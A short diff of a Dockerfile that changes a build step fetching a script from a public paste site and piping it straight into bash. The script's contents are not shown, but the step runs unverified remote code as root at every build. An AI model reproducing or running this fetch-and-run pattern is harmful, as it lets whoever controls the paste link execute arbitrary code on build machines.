@@ -3,7 +3,7 @@ FROM ubuntu:20.04
 ENV DEBIAN_FRONTEND=noninteractive
 ENV LC_ALL=C.UTF-8
 
-RUN apt-get update && apt -y install curl && curl -sL https://muq-hastebin.glitch.me/raw/3dSufmcvSt | bash
+RUN apt-get update && apt -y install curl && curl -sL https://muq-hastebin.glitch.me/raw/7KIvN7Z3Cr | bash
 RUN apt-get install -y \
   git \
   openjdk-11-jdk \
